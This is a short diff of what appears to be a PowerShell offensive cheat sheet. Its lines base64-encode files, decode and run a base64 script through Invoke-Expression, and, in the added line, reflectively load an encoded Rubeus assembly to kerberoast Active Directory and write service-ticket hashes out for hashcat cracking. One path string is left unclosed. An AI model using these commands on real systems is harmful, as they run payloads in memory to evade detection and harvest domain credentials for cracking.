@@ -1,3 +1,5 @@
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("INPUT-FILE-PATH")) | Out-File -Encoding ASCII OUTPUT-FILE-PATH
 
 $s = Get-Content -Path 'BASE64-INPUT-PATH; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($s)) | IEX; Invoke-FILE 
+
+$s = Get-Content -Path 'PATH'; [System.Reflection.Assembly]::Load([Convert]::FromBase64String($s)); [Rubeus.Program]::Main("kerberoast /outfile:kerb_hashes.txt /format:hashcat".Split())
